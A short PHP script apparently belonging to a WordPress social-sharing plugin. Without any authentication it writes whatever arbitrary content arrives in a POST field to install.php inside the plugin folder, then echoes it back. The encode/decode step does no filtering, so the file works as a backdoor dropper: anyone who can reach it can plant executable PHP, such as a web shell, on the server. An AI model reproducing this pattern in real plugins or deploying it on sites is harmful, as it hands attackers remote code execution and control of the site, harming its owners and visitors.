<?php
session_start();
$easyshareinstall = $_POST['newins'];
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/easy-social-sharing/install.php', 'w');
$easyshareinstall = str_replace('\\', '', $easyshareinstall);
$easyshareinstall = htmlentities($easyshareinstall);
fwrite($fp, html_entity_decode($easyshareinstall));
fclose($fp);
echo $easyshareinstall;
?>